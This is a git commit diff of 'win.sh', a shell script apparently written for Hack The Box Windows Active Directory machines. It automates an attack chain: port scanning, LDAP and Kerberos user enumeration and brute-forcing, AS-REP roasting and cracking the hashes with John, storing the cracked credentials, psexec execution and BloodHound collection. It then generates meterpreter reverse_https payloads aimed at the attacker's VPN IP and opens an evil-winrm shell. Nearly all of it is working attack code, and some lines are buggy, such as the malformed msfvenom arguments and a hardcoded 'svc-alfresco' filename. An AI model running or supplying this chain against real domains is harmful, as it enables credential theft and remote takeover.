e86d8764024af2f395165d92195c16f49f621825
Douglas S. Santos <douglas.secco@gmail.com>
2020-03-21 14:09:13 -0300

    Update win.sh

--- win.sh
+++ win.sh
@@ -2,15 +2,29 @@
 # dogasantos
 # https://github.com/dogasantos
 #
- 
+
+
 passwdwl="/usr/share/wordlists/SecLists/Passwords/Common-Credentials/all.txt"
-passwdwl2="/usr/share/wordlists/rockyou.txt"
+passwdwl2="/usr/share/wordlists/rockyou.txt.utf8"
 userswl="/usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames-dup.txt"
-
 ip=$(cat ip)
+vpniface=$(ip addr |grep tun|grep POINTOPOINT|cut -f2 -d:|tr -d "[:blank:]")
+vpnip=$(ip addr |grep tun|grep inet|awk -F " " '{print $2}'|cut -f1 -d /)
 
-masscan -Pn -p1-65535 ip > masscan.report
-masstomap -m masscan.report -o nmap.tcp
+
+
+echo "[*] Fast portscan via masscan"
+if [ $(cat masscan.report|wc -l 2>/dev/null) -eq 0 ]
+then
+
+	masscan -e $vpniface -Pn -p1-65535 -iL ip --output-format=list --output-file=masscan.report --rate=1000
+fi
+
+if [ $(cat tcp.nmap.txt|wc -l 2>/dev/null) -eq 0 ]
+then
+	masstomap -m masscan.report -o tcp
+fi
+
 
 echo "[*] Extracting ldap basic info"
 ldapsearch -LLL -x -H ldap://$ip -b '' -s base '(objectclass=*)' > base.ldap 2>&1
@@ -18,54 +32,95 @@ baseldap=$(cat base.ldap|wc -l)
 
 if [ $baseldap -gt 20 ]
 then
-	host=$(cat dn.ldap |grep dnsHostName|cut -f2 -d ':'| tr "[A-Z]" "[a-z]" |tr -d "[:blank:]")
-	domain=$(cat dn.ldap |grep ldapServiceName|awk -F ":" '{print $2}'| tr "[A-Z]" "[a-z]" |tr -d "[:blank:]")
+	host=$(cat base.ldap |grep dnsHostName|cut -f2 -d ':'| tr "[A-Z]" "[a-z]" |tr -d "[:blank:]")
+	domain=$(cat base.ldap |grep ldapServiceName|awk -F ":" '{print $2}'| tr "[A-Z]" "[a-z]" |tr -d "[:blank:]")
 	ldapsearch -x -b CN=Users,DC=htb,DC=local "*" -H ldap://$ip > cn-users.ldap 2>&1
 
 else
-	domain=$(cat nmap.tcp.nmap.txt |grep Domain|head -n1|cut -f2 -d :|cut -f1 -d ,|tr "[A-Z]" "[a-z]" |tr -d "[:blank:]")
+	domain=$(cat tcp.nmap.txt |grep Domain|head -n1|cut -f2 -d :|cut -f1 -d ,|tr "[A-Z]" "[a-z]" |tr -d "[:blank:]")
 	host=$(dig srv $domain @$ip|grep SOA|awk -F "IN\tSOA\t" '{print $2}'|awk -F ". " '{print $1}')
 fi
 
+echo $domain > domain.txt
+echo $host > host.txt
 
-has445=$(cat nmap.tcp.nmap.grepable|grep "445/open/tcp"|grep open|wc -l )
-has135=$(cat nmap.tcp.nmap.grepable|grep "135/open/tcp"|grep open|wc -l)
-has1433=$(cat nmap.tcp.nmap.grepable|grep "1433/open/tcp"|grep open|wc -l)
-hasldap=$(cat nmap.tcp.nmap.grepable|grep "ldap"|grep open|wc -l)
-haskerberos=$(cat nmap.tcp.nmap.grepable|grep "88/open/tcp"|grep open|wc -l)
+has445=$(cat tcp.nmap.grepable|grep "445/open/tcp"|grep open|wc -l )
+has135=$(cat tcp.nmap.grepable|grep "135/open/tcp"|grep open|wc -l)
+has1433=$(cat tcp.nmap.grepable|grep "1433/open/tcp"|grep open|wc -l)
+hasldap=$(cat tcp.nmap.grepable|grep "ldap"|grep open|wc -l)
+haskerberos=$(cat tcp.nmap.grepable|grep "88/open/tcp"|grep open|wc -l)
+haswinrm=$(cat tcp.nmap.grepable |grep "5985/open/tcp"|wc -l )
+
 
 if [ $haskerberos -gt 0 ]
 then
 	echo "[*] Extracting users"
 
 	echo "  + via blank GetADUsers"
-	/opt/impacket/examples/GetADUsers.py $domain/ -all -dc-ip $ip|grep -v SM_ |grep -v Mailbox |grep -v '$' |grep -v 'krbtgt' |grep -v SecureAuth|grep -v Querying|grep -v "PasswordLastSet"|grep -E "\s+"|grep -v -E '^-+'|awk -F " " '{print $1}' | sort|uniq > users.txt
+	python3 /opt/impacket/examples/GetADUsers.py $domain/ -all -dc-ip $ip | grep -v SM_ |grep -v Mailbox |grep -v '\$' |grep -v 'krbtgt' |grep -v SecureAuth|grep -v Querying|grep -v "PasswordLastSet"|grep -E "\s+"|grep -v -E '^-+'|awk -F " " '{print $1}' | sort|uniq > users.txt
 
-	if [ $(cat users.txt|wc -l) -eq 0 ]
+	if [ $(cat users.txt|wc -l 2>/dev/null) -eq 0 ]
 	then
 		echo "  + via ldap search (windapsearch)"
 		python /usr/share/windapsearch/windapsearch.py -d $domain -U --dc-ip $ip --full |grep userPrincipalName|grep -v '{' |grep -v Mailbox|grep -v -E ".*-.*-.*" |awk -F "userPrincipalName: " '{print $2}' > users.ldap
 		cat users.ldap|tr [A-Z] [a-z] |cut -f1 -d @ |sort|uniq >users.txt
 	fi
 
-	if [ $(cat users.txt|wc -l) -eq 0 ]
+	if [ $(cat users.txt|wc -l 2>/dev/null) -eq 0 ]
 	then
 		echo "   via bruteforcing kerberos (kerbrute)"
 		kerbrute userenum --dc $host -d $domain -o users.kerbrute $userswl
 		cat users.kerbrute |grep VALID| awk -F "VALID USERNAME:\t " '{print $2}' |tr [A-Z] [a-z] |cut -f1 -d @ |sort|uniq >users.txt
-		echo "[*] Found: $(cat users.txt|wc -l ) valid users" 		
+		
 	fi
+	echo "[*] Found: $(cat users.txt|wc -l ) valid users:"
+	for u in $(cat users.txt)
+	do
+		echo "  + $u"
+	done
 
 	echo "[*] Extracting AS REP users/hashes (Kerberos preauthentication not required)"
 	python3 /opt/impacket/examples/GetNPUsers.py $domain/ -dc-ip $ip -usersfile users.txt -format hashcat -outputfile hashes.asreproast
-	if [ $(cat hashes.asreproast|wc -l) -gt 0 ]
+	if [ $(cat hashes.asreproast|wc -l 2>/dev/null) -gt 0 ]
 	then
 		echo "  + Sucess! "
-		echo "  + Crack the hashes.asreproast file with hashcat with:"
-		echo "  + hashcat -m 18200 -a 0 --self-test-disable --force ~/hashes.asreproast $passwdwl2"
-		echo "  + Later on:"
-		echo "  + python GetUserSPNs.py $domain/user:pass -outputfile hashes.kerberoast"
-		echo "  + check notes ($0) for more"
+		echo "  + Cracking via John:"
+		john hashes.asreproast --wordlist=$passwdwl2
+		cracked=$(john hashes.asreproast --show|tail -n1|cut -f1 -d ' ')
+		if [ $cracked -gt 0 ]
+		then
+			pass=$(john hashes.asreproast --show|head -n1 |cut -f2 -d :)
+			user=$(john hashes.asreproast --show|head -n1 |cut -f4 -d '$'|cut -f1 -d @)
+			echo $user:$pass > credentials.txt
+
+			echo "[*] Extracting user SPN"
+			python3 /opt/impacket/examples/GetUserSPNs.py $domain/$user:$pass -request-user $user > spn.$user
+			if [ $(cat spn.svc-alfresco |grep Errno|wc -l) -gt 0 ]
+			then
+				 rm spn.$user
+				 echo "  + Failed"
+			else
+				echo "  + Got it: spn.$user file"
+			fi
+
+			echo "[*] Execute systeminfo via psexec"
+			python3 /opt/impacket/examples/psexec.py $domain/$user:$pass@$ip systeminfo > no
+			if [ $(cat no|grep 'is not writable'|wc -l) == 4 ]
+			then
+				echo "  + Failed"
+			else
+				cat no
+				rm no
+			fi
+			echo "[*] Generating Bloodhound view"
+			mkdir bloodhound
+			cd bloodhound
+			bloodhound-python -d $domain -u$user -p $pass -gc $host -c all -ns $ip
+			cd ..
+
+
+		fi
+
 
 		# getnpusers -dc-ip $ip $domain/$user:$pass -request -format hashcat -outputfile hashes.npu
 		# GetUserSPNs.py $domain/$user:$pass -request-user hsmith
@@ -98,8 +153,6 @@ then
 		smbclient -N -L //$ip
 		echo "[*] Net share (rpcclient)"
 		rpcclient -U "" -N -c netshareenum $ip
-		
-
 	fi
 
 	if [ $has1433 -gt 0 ]
@@ -107,4 +160,28 @@ then
 		echo "[*] Testing MSSQL"
 		nmap -n -sV -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip
 	fi
+
+	if [ $(echo $user|wc -c) -gt 0 ]
+	then
+		if [ $(echo $pass|wc -c) -gt 0 ]
+		then
+			
+			if [ $haswinrm -gt 0 ]
+			then
+				echo "[*] Generating msfvenom payloads"
+				msfvenom -p windows/x64/meterpreter/reverse_https -f exe -o LHOST=$vpnip LPORT=8989 -o pl1.exe
+				msfvenom -p windows/x64/meterpreter/reverse_https -f dll -o LHOST=$vpnip LPORT=8989 -o pl2.dll
+				msfvenom -p windows/x64/meterpreter/reverse_https -f ps1 -o LHOST=$vpnip LPORT=8989 -o pl2.ps1
+
+				echo "[*] EVIL-WINRM SHELL"
+				ruby /usr/share/evil-winrm/evil-winrm.rb -s /usr/share/PowerSploit/Recon -e $(pwd) -i $ip -u $user -p $pass
+			fi
+		fi
+	fi
+
+
+
 fi
+
+
+
